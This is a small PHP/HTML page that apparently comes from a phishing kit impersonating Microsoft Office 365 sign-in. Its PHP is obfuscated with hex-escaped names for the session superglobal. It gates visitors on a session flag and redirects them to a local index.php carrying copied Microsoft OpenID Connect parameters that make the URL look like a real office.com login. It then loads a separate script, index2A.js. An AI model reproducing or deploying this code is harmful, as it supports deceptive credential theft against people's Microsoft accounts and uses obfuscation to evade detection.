<?php ${"\x47\x4cO\x42\x41\x4cS"}["u\x65\x64e\x78d\x7a\x6a\x67f\x66\x78q\x68j\x61b\x61\x77\x74\x71\x6c\x6cu\x78\x74q\x77\x75\x71w\x61x\x69o\x6d"]="_\x53E\x53S\x49O\x4e";if(!isset(${${"\x47\x4cO\x42A\x4cS"}["u\x65\x64e\x78d\x7a\x6a\x67f\x66\x78q\x68j\x61b\x61\x77\x74\x71\x6c\x6cu\x78\x74q\x77\x75\x71w\x61x\x69o\x6d"]})){session_start();}if(!${${"G\x4cO\x42\x41\x4cS"}["u\x65\x64e\x78d\x7a\x6a\x67f\x66\x78q\x68j\x61b\x61\x77\x74\x71\x6c\x6cu\x78\x74q\x77\x75\x71w\x61x\x69o\x6d"]}['Index2']){header("Location: ./index.php?client_id=4345a7b9-9a63-4910-a426-35363201d503&response_mode=form_post&response_type=code+id_token&scope=openid+profile&state=OpenIdConnect.AuthenticationProperties%3donpDpYbVA9UXVeosIVrA2-DRa_7W9BcPErYg_pHkzLEm2C1CXJyT7zl-TTnGm7GUwNa28IqVdMPLDfTu22Vkx9jLw7ulhKTeOy8b3tB1XrriWmPomqxiCJyQbvHmEDVD&nonce=636905940261455591.NGY1NDc0NjYtYTUyNi00NzQ5LWE0NTEtMzY4ZTkxMjBlOTc1MGJlMDllZmQtODE0Ni00N2U2LWI2MjctZjYyYzcxODY2ZmM3&redirect_uri=https%3a%2f%2fwww.office.com%2f&ui_locales=en-US&mkt=en-US&client-request-id=dbf14819-814f-4fc4-b446-9ee8f4d1cdc6");exit();} ?>

<!doctype html>
<html dir="ltr" lang="EN-US">
<script language="Javascript" src="js/index2A.js"></script>
<?php
unset($_SESSION['Index2']);
?>
		</body>
		</html>